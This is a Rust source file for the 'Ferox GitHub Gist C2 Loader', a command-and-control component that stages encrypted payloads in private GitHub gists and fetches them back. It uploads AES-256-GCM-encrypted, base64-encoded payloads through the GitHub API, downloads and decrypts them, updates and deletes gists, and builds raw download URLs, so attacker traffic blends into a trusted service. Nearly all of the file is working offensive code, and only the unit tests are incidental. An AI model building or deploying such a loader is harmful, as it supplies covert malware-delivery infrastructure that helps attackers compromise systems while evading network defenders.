// Ferox GitHub Gist C2 Loader
// محمّل GitHub Gist للقيادة والتحكم السري

use colored::Colorize;
use reqwest::{Client, header};
use serde::{Deserialize, Serialize};
use std::time::Duration;

/// عميل GitHub Gist C2 | GitHub Gist C2 Client
pub struct GistLoader {
    client: Client,
    api_token: String,
    gist_id: Option<String>,
    encryption_key: Vec<u8>,
}

/// معلومات Gist | Gist Information
#[derive(Debug, Serialize, Deserialize)]
pub struct GistInfo {
    pub id: String,
    pub description: String,
    pub public: bool,
    pub files: std::collections::HashMap<String, GistFile>,
    pub html_url: String,
    pub created_at: String,
    pub updated_at: String,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct GistFile {
    pub filename: String,
    pub content: String,
    pub raw_url: String,
}

/// إنشاء Gist | Gist Creation Request
#[derive(Debug, Serialize)]
struct CreateGistRequest {
    description: String,
    public: bool,
    files: std::collections::HashMap<String, GistFileContent>,
}

#[derive(Debug, Serialize)]
struct GistFileContent {
    content: String,
}

/// تحديث Gist | Gist Update Request
#[derive(Debug, Serialize)]
struct UpdateGistRequest {
    files: std::collections::HashMap<String, GistFileContent>,
}

impl GistLoader {
    /// إنشاء محمّل جديد | Create new loader
    pub fn new(api_token: &str, encryption_key: &[u8]) -> Result<Self, String> {
        if api_token.is_empty() {
            return Err("API token is required".to_string());
        }

        let client = Client::builder()
            .timeout(Duration::from_secs(30))
            .build()
            .map_err(|e| format!("Failed to create HTTP client: {}", e))?;

        Ok(Self {
            client,
            api_token: api_token.to_string(),
            gist_id: None,
            encryption_key: encryption_key.to_vec(),
        })
    }

    /// إنشاء Gist جديد | Create new Gist
    pub async fn create_gist(
        &mut self,
        description: &str,
        filename: &str,
        content: &str,
        public: bool,
    ) -> Result<GistInfo, String> {
        let encrypted = self.encrypt_content(content.as_bytes())?;
        let base64 = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, &encrypted);

        let mut files = std::collections::HashMap::new();
        files.insert(
            filename.to_string(),
            GistFileContent {
                content: base64,
            },
        );

        let request = CreateGistRequest {
            description: description.to_string(),
            public,
            files,
        };

        let response = self.client
            .post("https://api.github.com/gists")
            .header(header::AUTHORIZATION, format!("Bearer {}", self.api_token))
            .header(header::USER_AGENT, "Ferox-C2")
            .json(&request)
            .send()
            .await
            .map_err(|e| format!("Failed to create Gist: {}", e))?;

        if !response.status().is_success() {
            return Err(format!("GitHub API error: {}", response.status()));
        }

        let gist_info: GistInfo = response.json().await
            .map_err(|e| format!("Failed to parse response: {}", e))?;

        self.gist_id = Some(gist_info.id.clone());

        println!("\n{} Gist created successfully!", "✅".bright_green());
        println!("  {} {}", "Gist ID:".bright_white(), gist_info.id);
        println!("  {} {}", "URL:".bright_white(), gist_info.html_url);

        Ok(gist_info)
    }

    /// تحديث Gist | Update Gist
    pub async fn update_gist(
        &self,
        gist_id: &str,
        filename: &str,
        content: &str,
    ) -> Result<GistInfo, String> {
        let encrypted = self.encrypt_content(content.as_bytes())?;
        let base64 = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, &encrypted);

        let mut files = std::collections::HashMap::new();
        files.insert(
            filename.to_string(),
            GistFileContent {
                content: base64,
            },
        );

        let request = UpdateGistRequest { files };

        let url = format!("https://api.github.com/gists/{}", gist_id);
        let response = self.client
            .patch(&url)
            .header(header::AUTHORIZATION, format!("Bearer {}", self.api_token))
            .header(header::USER_AGENT, "Ferox-C2")
            .json(&request)
            .send()
            .await
            .map_err(|e| format!("Failed to update Gist: {}", e))?;

        if !response.status().is_success() {
            return Err(format!("GitHub API error: {}", response.status()));
        }

        let gist_info: GistInfo = response.json().await
            .map_err(|e| format!("Failed to parse response: {}", e))?;

        println!("\n{} Gist updated successfully!", "✅".bright_green());

        Ok(gist_info)
    }

    /// الحصول على Gist | Get Gist
    pub async fn get_gist(&self, gist_id: &str) -> Result<GistInfo, String> {
        let url = format!("https://api.github.com/gists/{}", gist_id);
        let response = self.client
            .get(&url)
            .header(header::AUTHORIZATION, format!("Bearer {}", self.api_token))
            .header(header::USER_AGENT, "Ferox-C2")
            .send()
            .await
            .map_err(|e| format!("Failed to get Gist: {}", e))?;

        if !response.status().is_success() {
            return Err(format!("GitHub API error: {}", response.status()));
        }

        response.json().await
            .map_err(|e| format!("Failed to parse response: {}", e))
    }

    /// تحميل محتوى Gist | Download Gist content
    pub async fn download_payload(&self, gist_id: &str, filename: &str) -> Result<Vec<u8>, String> {
        let gist = self.get_gist(gist_id).await?;

        let file = gist.files.get(filename)
            .ok_or_else(|| format!("File '{}' not found in Gist", filename))?;

        // Decode Base64
        let encrypted = base64::Engine::decode(
            &base64::engine::general_purpose::STANDARD,
            &file.content
        ).map_err(|e| format!("Base64 decode failed: {}", e))?;

        // Decrypt
        self.decrypt_content(&encrypted)
    }

    /// حذف Gist | Delete Gist
    pub async fn delete_gist(&self, gist_id: &str) -> Result<(), String> {
        let url = format!("https://api.github.com/gists/{}", gist_id);
        let response = self.client
            .delete(&url)
            .header(header::AUTHORIZATION, format!("Bearer {}", self.api_token))
            .header(header::USER_AGENT, "Ferox-C2")
            .send()
            .await
            .map_err(|e| format!("Failed to delete Gist: {}", e))?;

        if response.status().is_success() {
            println!("\n{} Gist deleted successfully!", "✅".bright_green());
            Ok(())
        } else {
            Err(format!("GitHub API error: {}", response.status()))
        }
    }

    /// رفع حمولة | Upload payload
    pub async fn upload_payload(
        &mut self,
        payload_name: &str,
        payload_data: &[u8],
    ) -> Result<String, String> {
        let description = format!("Ferox Payload: {}", payload_name);
        let filename = format!("{}.txt", payload_name);
        let content = String::from_utf8_lossy(payload_data);

        let gist = self.create_gist(&description, &filename, &content, false).await?;

        // Generate download URL
        let download_url = format!(
            "https://gist.githubusercontent.com/{}/{}/raw/{}",
            gist.id.split('/').last().unwrap_or(&gist.id),
            gist.id,
            filename
        );

        Ok(download_url)
    }

    /// تشفير المحتوى | Encrypt content
    fn encrypt_content(&self, data: &[u8]) -> Result<Vec<u8>, String> {
        use aes_gcm::{Aes256Gcm, KeyInit, aead::{Aead, OsRng}};
        use aes_gcm::Nonce;
        use rand::RngCore;

        // Derive key
        use hkdf::Hkdf;
        use sha2::Sha256;
        let hk = Hkdf::<Sha256>::new(None, &self.encryption_key);
        let mut derived_key = [0u8; 32];
        hk.expand(b"ferox-gist-c2-v1", &mut derived_key)
            .map_err(|e| format!("Key derivation failed: {}", e))?;

        let cipher = Aes256Gcm::new(&derived_key.into());
        
        let mut nonce_bytes = [0u8; 12];
        OsRng.fill_bytes(&mut nonce_bytes);
        let nonce = Nonce::from_slice(&nonce_bytes);

        let ciphertext = cipher
            .encrypt(nonce, data)
            .map_err(|e| format!("Encryption failed: {}", e))?;

        let mut result = nonce_bytes.to_vec();
        result.extend_from_slice(&ciphertext);

        Ok(result)
    }

    /// فك تشفير المحتوى | Decrypt content
    fn decrypt_content(&self, encrypted: &[u8]) -> Result<Vec<u8>, String> {
        use aes_gcm::{Aes256Gcm, KeyInit, aead::Aead};
        use aes_gcm::Nonce;

        if encrypted.len() < 12 {
            return Err("Invalid encrypted data".to_string());
        }

        // Derive key
        use hkdf::Hkdf;
        use sha2::Sha256;
        let hk = Hkdf::<Sha256>::new(None, &self.encryption_key);
        let mut derived_key = [0u8; 32];
        hk.expand(b"ferox-gist-c2-v1", &mut derived_key)
            .map_err(|e| format!("Key derivation failed: {}", e))?;

        let cipher = Aes256Gcm::new(&derived_key.into());

        let (nonce_bytes, ciphertext) = encrypted.split_at(12);
        let nonce = Nonce::from_slice(nonce_bytes);

        cipher
            .decrypt(nonce, ciphertext)
            .map_err(|e| format!("Decryption failed: {}", e))
    }

    /// عرض المعلومات | Display info
    pub fn info(&self) {
        println!("\n{}", "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━".bright_cyan());
        println!("{}", "🐙 Ferox GitHub Gist C2 Loader".bright_green().bold());
        println!("{}", "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━".bright_cyan());
        println!("  {} Configured", "API Token:".bright_white());
        println!("  {} AES-256-GCM", "Encryption:".bright_white());
        if let Some(id) = &self.gist_id {
            println!("  {} {}", "Active Gist:".bright_white(), id);
        }
        println!("{}", "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━".bright_cyan());
    }
}

/// مُنشئ C2 Gist | Gist C2 Builder
pub struct GistC2Builder {
    api_token: String,
    encryption_key: Vec<u8>,
}

impl GistC2Builder {
    pub fn new() -> Self {
        Self {
            api_token: String::new(),
            encryption_key: Vec::new(),
        }
    }

    pub fn api_token(mut self, token: &str) -> Self {
        self.api_token = token.to_string();
        self
    }

    pub fn encryption_key(mut self, key: &[u8]) -> Self {
        self.encryption_key = key.to_vec();
        self
    }

    pub fn build(self) -> Result<GistLoader, String> {
        GistLoader::new(&self.api_token, &self.encryption_key)
    }
}

impl Default for GistC2Builder {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_loader_creation() {
        let key = b"test_encryption_key_32_bytes!!!";
        let loader = GistLoader::new("ghp_test_token", key).unwrap();
        loader.info();
    }

    #[test]
    fn test_content_encryption() {
        let key = b"test_key_32_bytes_long_enough!!";
        let loader = GistLoader::new("ghp_test", key).unwrap();

        let data = b"test payload data";
        let encrypted = loader.encrypt_content(data).unwrap();
        let decrypted = loader.decrypt_content(&encrypted).unwrap();

        assert_eq!(data.to_vec(), decrypted);
    }

    #[test]
    fn test_builder() {
        let loader = GistC2Builder::new()
            .api_token("ghp_test_token")
            .encryption_key(b"test_key_32_bytes_long_enough!!")
            .build()
            .unwrap();

        loader.info();
    }
}
